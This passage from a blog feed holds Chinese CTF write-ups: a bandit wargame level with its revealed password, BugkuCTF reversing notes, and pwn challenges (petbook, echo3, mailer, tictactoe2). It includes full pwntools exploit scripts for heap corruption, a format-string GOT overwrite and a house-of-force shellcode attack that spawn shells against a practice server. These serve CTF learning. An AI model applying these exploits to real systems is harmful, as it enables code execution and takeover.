-c或——complerment：取代所有不属于第一字符集的字符； -d或——delete：删除所有属于第一字符集的字符； -s或--squeeze-repeats：把连续重复的字符以单独一个字符表示； -t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。 tr能使用的字符类： [:alnum:]：字母和数字 [:alpha:]：字母 [:cntrl:]：控制（非打印）字符 [:digit:]：数字 [:graph:]：图形字符 [:lower:]：小写字母 [:print:]：可打印字符 [:punct:]：标点符号 [:space:]：空白字符 [:upper:]：大写字母 [:xdigit:]：十六进制字符 用法： 转换大小写： echo &quot;HELLO WORLD&quot; | tr &#39;A-Z&#39; &#39;a-z&#39; or echo &quot;HELLO WORLD&quot; | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39; 这一题输入的命令 bandit11@bandit:~$ cat data.txt | tr &#39;a-zA-Z&#39; &#39;n-za-mN-ZA-M&#39; The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu 密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu bandit12未完待续]]></content>
      <categories>
        <category>wargames</category>
      </categories>
      <tags>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF RE writeup]]></title>
    <url>%2F2018%2F10%2F04%2F2018-10-4-BugkuCTF-RE-writeup%2F</url>
    <content type="text"><![CDATA[最近想搞下逆向，就去刷了下BugkuCTF的逆向题 Easy_vb这是一道VB的逆向，下了个VB Decomoplier,反编译一下就可以看到flag了 easy_re拿ida打开文件，在比较语句那下个断点，动态调试，在内存中就可以看到flag了 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax __int128 v5; // [esp+0h] [ebp-44h] __int64 v6; // [esp+10h] [ebp-34h] int v7; // [esp+18h] [ebp-2Ch] __int16 v8; // [esp+1Ch] [ebp-28h] char v9; // [esp+20h] [ebp-24h] _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((const __m128i *)&amp;xmmword_11F3E34)); v7 = 0; v6 = qword_11F3E44; v8 = 0; printf(&quot;欢迎来到DUTCTF呦\n&quot;); printf(&quot;这是一道很可爱很简单的逆向题呦\n&quot;); printf(&quot;输入flag吧:&quot;); scanf(&quot;%s&quot;, &amp;v9); v3 = strcmp((const char *)&amp;v5, &amp;v9);//在这下个断点 if ( v3 ) v3 = -(v3 &lt; 0) | 1; if ( v3 ) printf(aFlag_0); else printf((const char *)&amp;unk_11F3E90); system(&quot;pause&quot;); return 0; } 游戏过关这个就比较神奇，我拿到程序一顿瞎输，flag就出来了……. 只要依次输入 0-8,就可以看到flag了 Timer逆向入门拖到010editor中，发现是个base64，将它转换成图片会获得一个二维码，扫码得flag]]></content>
      <categories>
        <category>BugkuCTF RE writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[petbook writeup]]></title>
    <url>%2F2018%2F10%2F04%2F2018-10-3-petbook-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/petbook/petbook&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 开启了NX和Canary还有 FORTIFY FORTIFY是用来检测缓存区溢出的一个机制，感觉好像没什么用，详情参考这篇博客 逆出来的user结构体 struct user { int uid; char name[0x100]; char pwd[0x100]; int flag; char *petname; char *post; }users; pet结构体 struct pet { int uid; char *name; char *type; }pet; //大致长这样 程序的功能有： register 创建用户 login 登陆 post edit post change password adopt pet rename pet abandon pet 程序的漏洞在于 register创建用户时，malloc的堆块未初始化，导致可以控制新创建的users的petname和post指针，可以通过post泄露信息，通过pet来实现任意地址写 int __fastcall user_create(char *src, char *password) { users *user; // rbp if ( user_find_by_name(src) ) return __printf_chk(1LL, &quot;User %s existed!\n&quot;, src); user = malloc(0x218uLL); //漏洞所在，没有初始化 user-&gt;uid = uid(); strncpy(user-&gt;name, src, 0x100uLL); strncpy(user-&gt;password, password, 0x100uLL); user-&gt;flag = 0; link_insert(&amp;userdb, user); return puts(&quot;User created&quot;); } 泄露信息：通过控制未初始化的user的pet指针，泄露信息 v4 = user-&gt;petname; if ( v4 ) { __printf_chk(1LL, &quot;= Pet Name: %s\n&quot;, *(v4 + 1)); __printf_chk(1LL, &quot;= Pet Type: %s\n&quot;, *(user-&gt;petname + 2)); } 任意地址写： int pet_rename() { __int64 v0; // rbx _DWORD *v1; // rdx v0 = current_user; if ( (*current_user ^ magic) &amp; 0xFFFF0000 ) { puts(&quot;corrupted object detected&quot;); exit(1); } v1 = *(current_user + 0x208); if ( !v1 ) return puts(&quot;You don&#39;t have a pet&quot;); if ( (*v1 ^ magic) &amp; 0xFFFF0000 ) //这里要绕过这个检查，所以要将magic泄露出来 { puts(&quot;corrupted object detected&quot;); exit(1); } puts(&quot;Name your pet &gt;&gt;&quot;); read_data(*(*(v0 + 0x208) + 8LL), 16LL); return stripnl(*(*(v0 + 0x208) + 8LL)); } 利用思路： 先create一个用户，这个用户new一个大小大于0x218的post,然后编辑这个post，增加它的大小， 使它原本的chunk被realloc函数free掉，放入unsortedbins中。这时再create一个用户，那么这 个用户malloc申请的chunk就会从unsortedbin中的chunk切割下来，就可以控制这个用户的petname 和post指针 具体步骤： 先创建一个用户’aaaa’,new一个post1,大小为0x230，将petname指针设置为userdb地址 - 0x10,然后编辑post1，使post1原本的chunk被relloca函数free掉 新建一个用户’bbbb’，泄露出堆地址 新建两个post，post2大小为0x100,post3大小为0x230，在post2中写入要泄露的地址，在post3中设置petname指针为post2的地址，post2的地址通过泄露的堆地址计算出来。通过控制 post2的内容，就可以泄露出想要的信息。 新建用户’cccc’,泄露出 magic和libc地址 new一个post4，将petname指针指向post2地址，然后编辑post4将原本的chunk free掉，新建一个用户’dddd’，用户’dddd’的petname指针就指向post2 伪造fake_magic，登陆用户’bbbb’，编辑post2内容为 p64(fake_magic)+p64(free_got) 登陆用户 ‘dddd’, 通过rename功能修改free_got为system函数 新建一个用户’ffff’, adopt一个pet ，name为’/bin/sh\x00’，再abandom掉就可调用system函数了 exp: #!/usr/bin/env python from pwn import * local = 1 context.log_level = &#39;debug&#39; if local: p = process(&#39;./petbook&#39;) elf = ELF(&#39;./petbook&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7710&#39; p = remote(host,port) elf = ELF(&#39;./petbook&#39;) libc = ELF(&#39;./libc-2.23.so.x86_64&#39;) def register(name,password): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;1&#39;) p.sendlineafter(&quot;Username &gt;&gt;\n&quot;,name) p.sendlineafter(&quot;Password &gt;&gt;\n&quot;,password) def login(name,password): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;2&#39;) p.sendlineafter(&quot;Username &gt;&gt;\n&quot;,name) p.sendlineafter(&quot;Password &gt;&gt;\n&quot;,password) def logout(): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;0&#39;) def post(title,size,content): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;1&#39;) p.sendlineafter(&quot;Title &gt;&gt;\n&quot;,title) p.sendlineafter(&quot;Content Length &gt;&gt;\n&quot;,str(size)) p.sendlineafter(&quot;Content &gt;&gt;\n&quot;,content) def edit_post(id,title,size,content): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;3&#39;) p.sendlineafter(&quot;Post id &gt;&gt;\n&quot;,str(id)) p.sendlineafter(&quot;New title &gt;&gt;\n&quot;,title) p.sendlineafter(&quot;New content size &gt;&gt;\n&quot;,str(size)) p.sendlineafter(&quot;Content &gt;&gt;\n&quot;,content) def adopt(name): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;5&#39;) p.sendlineafter(&quot;Name your pet &gt;&gt;\n&quot;,name) def rename(name): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;6&#39;) p.sendlineafter(&quot;Name your pet &gt;&gt;\n&quot;,name) def abandom(): p.sendlineafter(&quot; &gt;&gt;\n&quot;,&#39;7&#39;) payload1= &#39;a&#39;*0x208 + p64(0x603158-0x10)*4 register(&#39;aaaa&#39;,&#39;aaaa&#39;) login(&#39;aaaa&#39;,&#39;aaaa&#39;) post(&#39;1111&#39;,0x230,payload1) #post1 edit_post(2,&#39;1111&#39;,0x240,&#39;bbbb&#39;) logout() register(&#39;bbbb&#39;,&#39;bbbb&#39;) login(&#39;bbbb&#39;,&#39;bbbb&#39;) log.info(&quot;leak heap address&quot;) p.recvuntil(&quot;Pet Type: &quot;) leak_heap = u64(p.recvline().strip(&#39;\n&#39;).ljust(8,&#39;\x00&#39;)) heap_base = leak_heap - 0x230 log.info(&quot;leak heap_base address :{}&quot;.format(hex(heap_base))) fake_pet = heap_base + 0x940 magic = 0x603164 payload2 = &#39;a&#39;*0x208 + p64(fake_pet) post(&#39;2222&#39;,0x100,p64(elf.got[&quot;puts&quot;])*4) #uid = 4 post2 post(&#39;3333&#39;,0x230,payload2) #uid = 5 post3 edit_post(5,&#39;2222&#39;,0x240,&#39;2222&#39;) logout() register(&#39;cccc&#39;,&#39;cccc&#39;) login(&#39;cccc&#39;,&#39;cccc&#39;) p.recvuntil(&quot;Pet Name: &quot;) leak_libc = u64(p.recvline().strip(&#39;\n&#39;).ljust(8,&#39;\x00&#39;)) libc_base = leak_libc - libc.symbols[&#39;puts&#39;] libc.address = libc_base system = libc.symbols[&#39;system&#39;] log.info(&quot;libc address :{}&quot;.format(hex(libc_base))) logout() login(&#39;bbbb&#39;,&#39;bbbb&#39;) edit_post(4,&#39;3333&#39;,0x100,p64(magic)*4) logout() login(&#39;cccc&#39;,&#39;cccc&#39;) p.recvuntil(&quot;Pet Name: &quot;) leak_magic = u64(p.recvline().strip(&#39;\n&#39;).ljust(8,&#39;\x00&#39;)) log.info(&quot;leak magic : {}&quot;.format(hex(leak_magic))) log.info(&quot;hjack free_got&quot;) fake_magic = leak_magic + 0x600000000 payload3 = p64(fake_magic) + p64(elf.got[&#39;free&#39;]) payload4 = &#39;a&#39;*0x208 + p64(fake_pet) post(&#39;aaaa&#39;,0x230,payload4) #uid = 7 post4 edit_post(7,&#39;1111&#39;,0x240,&#39;aaaa&#39;) logout() register(&#39;dddd&#39;,&#39;dddd&#39;) login(&#39;bbbb&#39;,&#39;bbbb&#39;) edit_post(4,&#39;1111&#39;,0x100,payload3) logout() login(&#39;dddd&#39;,&#39;dddd&#39;) rename(p64(system)) logout() register(&#39;ffff&#39;,&#39;ffff&#39;) login(&#39;ffff&#39;,&#39;ffff&#39;) adopt(&#39;/bin/sh\x00&#39;) abandom() p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo3 writeup]]></title>
    <url>%2F2018%2F10%2F03%2F2018-10-2-echo3-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这道题是echo 和echo2的升级版，也是一个格式化字符串漏洞，不过它将printf的格式化字符串放到了bss段上去了。一般来说格式化字符串在bss段的话，就要在栈上构造跳板，通过跳板实现任意地址写。具体点就是，找到栈上指向栈的指针，向指针写入got表地址，然后再通过这实现任意地址写 main函数 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { void *v3; // esp int fd; // [esp+14h] [ebp-1Ch] int buf; // [esp+18h] [ebp-18h] unsigned int v6; // [esp+24h] [ebp-Ch] int *v7; // [esp+28h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); setbuf(stdout, 0); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &lt; 0 ) { puts(&quot;urandom error&quot;); exit(1); } read(fd, &amp;buf, 8u); read(fd, &amp;magic, 4u); close(fd); v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));//它在这里做了一个抬栈的操作 hardfmt(); } 这里打开了/dev/urandom文件，读取了8个字节到buf中，读取了4个字节到magic中。并且它利用alloca函数，做了一个抬栈的操作，alloca函数的作用是分配内存，不过是向栈申请内存。在这里被用来抬栈，而且每次都是随机的，所以要先爆破一下，泄露出地址后才进行下一步 stack 的情况 随机抬高后的栈大部分就像这样子 pwndbg&gt; stack 100 00:0000│ esp 0xffffaf1c —▸ 0x804864b (hardfmt+133) ◂— add esp, 0x10 01:0004│ 0xffffaf20 —▸ 0x804a080 (buff) ◂— &#39;aaaa\n&#39; ... ↓ 03:000c│ 0xffffaf28 ◂— 0x1000 04:0010│ 0xffffaf2c ◂— 0x0 05:0014│ 0xffffaf30 ◂— &#39;n,D*&#39; 06:0018│ 0xffffaf34 ◂— 0x0 ... ↓ 0c:0030│ 0xffffaf4c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e 0d:0034│ 0xffffaf50 ◂— 0x0 ... ↓ 0f:003c│ 0xffffaf58 —▸ 0xffffaf30 ◂— &#39;n,D*&#39; 10:0040│ 0xffffaf5c ◂— 0x519ab900 11:0044│ 0xffffaf60 ◂— 0x0 12:0048│ 0xffffaf64 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x1 13:004c│ ebp 0xffffaf68 —▸ 0xffffcfc8 ◂— 0x0 14:0050│ 0xffffaf6c —▸ 0x804877b (main+236) ◂— mov eax, 0 15:0054│ 0xffffaf70 ◂— 0x0 ... ↓ 这是我用到的栈情况,可以通过gdb调试，在alloca函数上下个断点，然后通过 set $eax=0x20来获得 pwndbg&gt; stack 100 00:0000│ esp 0xffbf8a6c —▸ 0x804864b (hardfmt+133) ◂— add esp, 0x10 01:0004│ 0xffbf8a70 —▸ 0x804a080 (buff) ◂— 0x35353325 (&#39;%355&#39;) ... ↓ 03:000c│ 0xffbf8a78 ◂— 0x1000 04:0010│ 0xffbf8a7c ◂— 0x1 05:0014│ 0xffbf8a80 ◂— 0x6c018c2e 06:0018│ 0xffbf8a84 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch 07:001c│ 0xffbf8a88 —▸ 0xf77ec918 ◂— 0x0 08:0020│ 0xffbf8a8c ◂— 0x0 09:0024│ 0xffbf8a90 —▸ 0xffbf8ace ◂— 0x30804 0a:0028│ 0xffbf8a94 —▸ 0xf75fe018 ◂— stosd dword ptr es:[edi], eax 0b:002c│ 0xffbf8a98 —▸ 0xf765321b (setbuffer+11) ◂— add ebx, 0x151de5 0c:0030│ 0xffbf8a9c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e 0d:0034│ 0xffbf8aa0 —▸ 0xf77d67eb (_dl_fixup+11) ◂— add esi, 0x15815 0e:0038│ 0xffbf8aa4 ◂— 0x1 0f:003c│ 0xffbf8aa8 —▸ 0xffbf8a80 ◂— 0x6c018c2e 10:0040│ 0xffbf8aac ◂— 0x3b9d0100 11:0044│ 0xffbf8ab0 —▸ 0xffbf8b18 ◂— 0x0 12:0048│ 0xffbf8ab4 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x1 13:004c│ ebp 0xffbf8ab8 —▸ 0xffbf8b18 ◂— 0x0 14:0050│ 0xffbf8abc —▸ 0x804877b (main+236) ◂— mov eax, 0 15:0054│ 0xffbf8ac0 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x1 16:0058│ 0xffbf8ac4 —▸ 0x804a060 (magic) ◂— 0x6c018c2e //偏移为21 17:005c│ 0xffbf8ac8 —▸ 0xf76c92ac (__close_nocancel+18) ◂— mov ebx, edx 18:0060│ 0xffbf8acc —▸ 0x804874a (main+187) ◂— add esp, 0x10 19:0064│ 0xffbf8ad0 ◂— 0x3 1a:0068│ 0xffbf8ad4 —▸ 0x804a060 (magic) ◂— 0x6c018c2e 1b:006c│ 0xffbf8ad8 ◂— 0x4 1c:0070│ 0xffbf8adc —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a 1d:0074│ 0xffbf8ae0 ◂— 0x8000 1e:0078│ 0xffbf8ae4 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 1f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 (&#39;QT_Q&#39;) //这是选择的跳板 20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— &#39;./echo3&#39; // 21:0084│ 0xffbf8af0 ◂— 0x1 22:0088│ 0xffbf8af4 ◂— 0x0 23:008c│ 0xffbf8af8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 (&#39;QT_Q&#39;) 24:0090│ 0xffbf8afc ◂— 0x3 25:0094│ 0xffbf8b00 ◂— 0x6771084c 26:0098│ 0xffbf8b04 ◂— 0xedf68435 27:009c│ 0xffbf8b08 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 (&#39;QT_Q&#39;) 28:00a0│ 0xffbf8b0c ◂— 0x3b9d0100 29:00a4│ 0xffbf8b10 —▸ 0xffbf8b30 ◂— 0x1 2a:00a8│ 0xffbf8b14 ◂— 0x0 ... ↓ 2c:00b0│ 0xffbf8b1c —▸ 0xf760b637 (__libc_start_main+247) ◂— add esp, 0x10 2d:00b4│ 0xffbf8b20 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ... ↓ 2f:00bc│ 0xffbf8b28 ◂— 0x0 30:00c0│ 0xffbf8b2c —▸ 0xf760b637 (__libc_start_main+247) ◂— add esp, 0x10 31:00c4│ 0xffbf8b30 ◂— 0x1 32:00c8│ 0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— &#39;./echo3&#39; 33:00cc│ 0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 (&#39;QT_Q&#39;) 34:00d0│ 0xffbf8b3c ◂— 0x0 ... ↓ 37:00dc│ 0xffbf8b48 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 38:00e0│ 0xffbf8b4c —▸ 0xf77ecc04 ◂— 0x0 39:00e4│ 0xffbf8b50 —▸ 0xf77ec000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c 3a:00e8│ 0xffbf8b54 ◂— 0x0 3b:00ec│ 0xffbf8b58 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ... ↓ 3d:00f4│ 0xffbf8b60 ◂— 0x0 3e:00f8│ 0xffbf8b64 ◂— 0xc11ec013 3f:00fc│ 0xffbf8b68 ◂— 0x7f634e02 40:0100│ 0xffbf8b6c ◂— 0x0 ... ↓ 43:010c│ 0xffbf8b78 ◂— 0x1 44:0110│ 0xffbf8b7c —▸ 0x80484b0 (_start) ◂— xor ebp, ebp 45:0114│ 0xffbf8b80 ◂— 0x0 46:0118│ 0xffbf8b84 —▸ 0xf77dd010 (_dl_runtime_resolve+16) ◂— pop edx 47:011c│ 0xffbf8b88 —▸ 0xf77d7880 (_dl_fini) ◂— push ebp 48:0120│ 0xffbf8b8c —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x1 49:0124│ 0xffbf8b90 ◂— 0x1 4a:0128│ 0xffbf8b94 —▸ 0x80484b0 (_start) ◂— xor ebp, ebp 4b:012c│ 0xffbf8b98 ◂— 0x0 4c:0130│ 0xffbf8b9c —▸ 0x80484e2 (_start+50) ◂— hlt 4d:0134│ 0xffbf8ba0 —▸ 0x804868f (main) ◂— lea ecx, [esp + 4] 4e:0138│ 0xffbf8ba4 ◂— 0x1 4f:013c│ 0xffbf8ba8 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— &#39;./echo3&#39; 50:0140│ 0xffbf8bac —▸ 0x80487a0 (__libc_csu_init) ◂— push ebp 51:0144│ 0xffbf8bb0 —▸ 0x8048800 (__libc_csu_fini) ◂— ret 52:0148│ 0xffbf8bb4 —▸ 0xf77d7880 (_dl_fini) ◂— push ebp 53:014c│ 0xffbf8bb8 —▸ 0xffbf8bbc —▸ 0xf77ec918 ◂— 0x0 54:0150│ 0xffbf8bbc —▸ 0xf77ec918 ◂— 0x0 55:0154│ 0xffbf8bc0 ◂— 0x1 56:0158│ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— &#39;./echo3&#39; //偏移为85 57:015c│ 0xffbf8bc8 ◂— 0x0 58:0160│ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 (&#39;QT_Q&#39;) //偏移为87 59:0164│ 0xffbf8bd0 —▸ 0xffbfa2db ◂— 0x5f474458 (&#39;XDG_&#39;) 5a:0168│ 0xffbf8bd4 —▸ 0xffbfa30d ◂— 0x4d4f4e47 (&#39;GNOM&#39;) 5b:016c│ 0xffbf8bd8 —▸ 0xffbfa339 ◂— 0x435f434c (&#39;LC_C&#39;) 5c:0170│ 0xffbf8bdc —▸ 0xffbfa34e ◂— 0x5f474458 (&#39;XDG_&#39;) 5d:0174│ 0xffbf8be0 —▸ 0xffbfa368 ◂— 0x5f474458 (&#39;XDG_&#39;) 5e:0178│ 0xffbf8be4 —▸ 0xffbfa37d ◂— 0x495f5451 (&#39;QT_I&#39;) 5f:017c│ 0xffbf8be8 —▸ 0xffbfa38f ◂— &#39;LOGNAME=zs0zrc&#39; 60:0180│ 0xffbf8bec —▸ 0xffbfa39e ◂— &#39;USER=zs0zrc&#39; 61:0184│ 0xffbf8bf0 —▸ 0xffbfa3aa ◂— 0x48544150 (&#39;PATH&#39;) 62:0188│ 0xffbf8bf4 —▸ 0xffbfa43b ◂— &#39;XDG_VTNR=7&#39; 63:018c│ 0xffbf8bf8 —▸ 0xffbfa446 ◂— 0x4d4f4e47 (&#39;GNOM&#39;) 先爆破，泄露出libc地址和栈的地址 while True: p = process(&#39;./echo3&#39;) payload = &#39;%43$p#%30$p&#39; p.sendline(payload) data = p.recvuntil(&#39;#&#39;,drop = True) if data[-3:] == &#39;637&#39;: break p.close() leak_libc = int(data,16) - 247 libc_base = leak_libc - libc.symbols[&#39;__libc_start_main&#39;] log.info(&quot;libc address {}&quot;.format(hex(libc_base))) leak_stack = int(p.recv().strip(&#39;\n&#39;),16) log.info(&quot;leak stack address{}&quot;.format(hex(leak_stack))) stack1 = leak_stack - 0x10c stack2 = leak_stack - 0x108 因为格式化字符串在bss段上，所以先要在栈上找到指向栈的指针，这里用到的是 1f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 (&#39;QT_Q&#39;) 20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— &#39;./echo3&#39; 修改为 1f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸0x804a000 (_GLOBAL_OFFSET_TABLE_) 20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸0x804a060 (magic) payload: payload1 = &quot;%{}c%{}$hn&quot;.format(stack1 &amp; 0xffff, 30) payload1 += &quot;%{}c%{}$hn&quot;.format(4, 31) payload1 += &#39;1111&#39; 这时再通过修改0xffbf8bcc和0xffbf8bc4 的内容为 print_got和printf_got+2 32:00c8│ 0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbf8ac4 —▸ 0x804a014 33:00cc│ 0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbf8ac0 —▸ 0x804a016 payload: payload2 = &quot;%{}c%{}$hn&quot;.format(printf_got &amp; 0xffff, 85) payload2 += &quot;%{}c%{}$hn&quot;.format(2, 87) payload2 += &quot;2222&quot; 最后向printf_got中写入system函数地址，发送’/bin/sh\x00’字符串，getshell payload: payload3 = &quot;%{}c%{}$hhn&quot;.format(system&gt;&gt; 16 &amp; 0xff, 20) payload3 += &quot;%{}c%{}$hn&quot;.format((system&amp; 0xffff) - (system &gt;&gt; 16 &amp; 0xff), 21) payload3 += &quot;3333&quot; 在这里膜下M4X大佬和D4rk3r大佬参考了他们的wirteupM4XD4rk3r]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mailer writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-mailer-writeup%2F</url>
    <content type="text"><![CDATA[防护机制 [*] &#39;/home/zs0zrc/pwn/Scoreboard/mailer/mailer&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 程序逻辑很简单，只有两个功能 write mail 和dump int service() { unsigned int v0; // eax qmemcpy(&amp;helloworld, &amp;unk_8048AA0, 0x48u); root = &amp;helloworld; memcpy(&amp;helloworld + 72, &quot;Hello, World&quot;, 0xCu); while ( 1 ) { while ( 1 ) { puts(&quot;0. Exit&quot;); puts(&quot;1. Write mail&quot;); puts(&quot;2. Dump mails&quot;); printf(&quot;Action: &quot;); v0 = readint(); if ( v0 != 1 ) break; write_mail(); } if ( v0 &lt; 1 ) break; if ( v0 == 2 ) dump_mail(); else puts(&quot;Invalid choice&quot;); } return puts(&quot;Bye&quot;); } 漏洞在于writemail函数中用了两个 gets来读取数据，而mail的大小size存储在chunk中，dump是根据chunk中存储的mail大小来输出的。所以可以修改mail的大小，从而泄露出堆的地址。同时也可以溢出修改topchunk的size字段，所以这个很明显是用house_of_force来做。因为没开NX，所以可以往堆里写shellcode，然后利用house_of_force修改puts_got为shellcode的地址来getshell char *write_mail() { int size; // eax char *mail; // ST1C_4 char *result; // eax printf(&quot;Content Length: &quot;); size = readint(); mail = new_mail(size); printf(&quot;Title: &quot;); gets(mail + 4); printf(&quot;Content: &quot;); gets(mail + 72); *mail = root; result = mail; root = mail; return result; } 具体步骤： new一个mail来存放shellcode，同时修改这个mail的size字段 再new一个mail，修改top_chunk的size字段为0xffffffff 利用dump函数泄露出heap地址 利用house_of_force修改puts_got为shellcode地址 exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./mailer&#39;) elf = ELF(&#39;./mailer&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7721&#39; p = remote(host,port) elf = ELF(&#39;./mailer&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def mail(size,title,content): ru(&#39;Action: &#39;) sl(&#39;1&#39;) ru(&#39;Length: &#39;) sl(str(size)) ru(&#39;Title: &#39;) sl(title) ru(&#39;Content: &#39;) sl(content) shellcode = asm(shellcraft.sh()) target = 0x0804A030 payload = &#39;a&#39;*12+ p32(0xffffffff) mail(50,&#39;a&#39;*16*4 + p32(0x40),shellcode + &#39;######&#39;) mail(10,&#39;aaaa&#39;,payload) rc() sl(&#39;2&#39;) ru(&#39;######&#39;) leak_heap = u32(p.recv(12)[6:10]) log.info(hex(leak_heap)) shellcode_add = leak_heap + 72 topchunk = leak_heap + 0xd0 evil_size = target - topchunk - 0x14 - 72 print evil_size mail(evil_size,&#39;aaaa&#39;,&#39;bbbb&#39;) mail(30,p32(shellcode_add)*2,&#39;dddd&#39;) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tictactoe2 writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-tictactoe2-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这题文件和tictactoe1是一样的，只不过这个要求getshell，漏洞点也就是一个任意地址写，我对着分析了半天除了想到将n修改成0，使得可以进行9次任意地址写 ，就想不到什么了，看了大佬的writeup才发现是用 ret2_dl_runtime_resolve做的 for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i ) { if ( n == -1 ) { sub_80489C0(); } else { sub_8048762(); sub_8048A4B(); } n = -n; } elf文件各个节的信息： LOAD:0804AF14 stru_804AF14 Elf32_Dyn &lt;1, &lt;1&gt;&gt; ; DATA XREF: LOAD:080480BC↑o LOAD:0804AF14 ; .got.plt:0804B000↓o LOAD:0804AF14 ; DT_NEEDED libc.so.6 LOAD:0804AF1C Elf32_Dyn &lt;0Ch, &lt;8048498h&gt;&gt; ; DT_INIT LOAD:0804AF24 Elf32_Dyn &lt;0Dh, &lt;8048DA4h&gt;&gt; ; DT_FINI LOAD:0804AF2C Elf32_Dyn &lt;19h, &lt;804AF04h&gt;&gt; ; DT_INIT_ARRAY LOAD:0804AF34 Elf32_Dyn &lt;1Bh, &lt;8&gt;&gt; ; DT_INIT_ARRAYSZ LOAD:0804AF3C Elf32_Dyn &lt;1Ah, &lt;804AF0Ch&gt;&gt; ; DT_FINI_ARRAY LOAD:0804AF44 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt; ; DT_FINI_ARRAYSZ LOAD:0804AF4C Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH LOAD:0804AF54 Elf32_Dyn &lt;5, 